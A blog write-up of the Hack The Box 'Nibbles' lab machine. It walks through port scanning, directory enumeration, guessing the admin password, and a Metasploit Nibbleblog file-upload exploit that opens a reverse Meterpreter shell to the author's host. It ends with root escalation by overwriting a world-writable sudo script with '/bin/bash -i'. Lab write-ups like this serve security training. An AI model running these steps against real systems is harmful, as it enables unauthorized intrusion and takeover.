---
author: Jean Chaput
pubDatetime: 2024-10-29T9:39:00Z
title: HTB Nibbles Box
postSlug: htb-nibbles
featured: false
draft: false
tags:
  - htb
  - box
  - write-up
description:
  Write-up for Nibbles Box on HTB
---

We start our exploration by scanning the target:

```bash
nmap -sV -sC -p- "10.10.10.75" -oA nmap_scan
```

We got the following output:

```markdown
Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-21 18:11 CEST
Nmap scan report for 10.10.10.75
Host is up (0.10s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4f8ade8f80477decf150d630a187e49 (RSA)
|   256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA)
|_  256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 195.67 seconds
```

Since there is an `HTTP` server running on port 80, let's navigate to `http://10.10.10.75/`, there is not a lot to see here so let's inspect the source code by hitting `Ctrl + U`.

At the bottom, we can see the following:
```html
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

Seems to be an interesting page to navigate, let's see if it exists.

We can see in the bottom-right corner `Powered by Nibbleblog` and by searching the web, we can find the [Nibbleblog CMS](https://github.com/dignajar/nibbleblog).

From here, we can look to the different links on the page and nothing seems to be interesting. We can try to enumerate sub directories or look into the CMS to understand how folders and files are structured.

```bash
gobuster dir -w /usr/share/wfuzz/general/common.txt -u http://$TARGET/nibbleblog/
```

This gives the following output :

```markdown
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.75/nibbleblog/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wfuzz/general/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin   (Status: 301) [Size: 321] [--> http://10.10.10.75/nibbleblog/admin/]
/content (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/content/]
Progress: 951 / 952 (99.89%)
===============================================================
Finished
===============================================================
```

By navigating to `/content/`, we find the `/private/` folder and inside we discover the following `user.xml` file :

```xml
<users>
	<user username="admin">
		<id type="integer">0</id>
		<session_fail_count type="integer">0</session_fail_count>
		<session_date type="integer">1514544131</session_date>
	</user>
	<blacklist type="string" ip="10.10.10.1">
		<date type="integer">1512964659</date>
		<fail_count type="integer">1</fail_count>
	</blacklist>
</users>
```

So now we know the admin user login with the username `admin`.

By looking to the CMS files and folders, we can see that there should be an `/admin.php` page which could be the login page for the administration panel.

This page is effectively here and we can see a login form that we can use with our `admin` username that we found earlier. Since we don't have the password we could try to use a dictionary attack with `Hydra`, but it seems that some blacklisting mechanisms are used there to prevent this kind of attack.

Since it is an **easy** box on Hack the Box, let's simply try the name of the box as the password : `nibbles` (not guessing here, just a habit from Hack the Box).

It worked ! While in, let's check what is the running version of Nibbleblog. We can do this by going to the `Settings` page and scrolling down on the page to reveal `Nibbleblog 4.0.3 "Coffee" - Developed by Diego Najar`.

With this information, let's search for any known exploit :

```bash
searchsploit "nibbleblog 4.0.3"
```

This displays the following output :

```markdown
-------------------------------------------------------- ---------------------
 Exploit Title                                          |  Path
-------------------------------------------------------- ---------------------
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)   | php/remote/38489.rb
-------------------------------------------------------- ---------------------
```

Let's run Metasploit :

```bash
msfconsole -q
```

In the `msfconsole`, we can run the following commands :

```bash
search nibbleblog
use exploit/multi/http/nibbleblog_file_upload
show options
set PASSWORD "nibbles"
set RHOSTS "10.10.10.75"
set TARGETURI "/nibbleblog"
set USERNAME "admin"
check
run
```

>  I used a Meterpreter payload for this one configured with my IP (VPN) and a listening port for the reverse TCP connection.

When we receive the reverse shell, we can directly try to identify who we are running our commands as:

```bash
getuid
```

This outputs : `Server username: nibbler`

Let's list the content in that user's home directory :

```bash
ls /home/nibbler
```

Here is the command output:

```markdown
Listing: /home/nibbler
======================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100600/rw-------  0     fil   2017-12-29 11:29:56 +0100  .bash_history
040775/rwxrwxr-x  4096  dir   2017-12-11 04:04:04 +0100  .nano
100400/r--------  1855  fil   2017-12-11 04:07:21 +0100  personal.zip
100400/r--------  33    fil   2024-09-21 13:32:33 +0200  user.txt
```

And here we have our user flag. Now let's look for privilege escalation. 

I'll first start by getting the [LinPEAS](https://github.com/peass-ng/PEASS-ng/blob/master/linPEAS) script on my machine (in another terminal):

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
```

And in Meterpreter :

```bash
upload linpeas.sh /tmp/linpeas.sh
shell
bash /tmp/linpeas.sh
```

Among the results we have, we can see the following output :

```markdown
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

This seems to be very interesting. In nibbler's home directory, we don't have the `personal` folder but we have a Zip file `personal.zip`. Let's unpack it :

```bash
unzip personal.zip
```

We can now see the permissions that we have on this file :

```bash
ls -al ~/personal/stuff
```

This gives us the following output :

```markdown
total 12
drwxr-xr-x 2 nibbler nibbler 4096 Dec 10  2017 .
drwxr-xr-x 3 nibbler nibbler 4096 Dec 10  2017 ..
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
```

This file has the `777` permissions, which means read, write and execute for everyone. We already know that we can execute it as root without a password. Let's simply modify it :

```bash
echo "/bin/bash -i" > ~/personal/stuff/monitor.sh
```

And finally we run it :

```bash
sudo ~/personal/stuff/monitor.sh
```

We are now root on the machine and we can grab the root flag in `/root/root.txt`.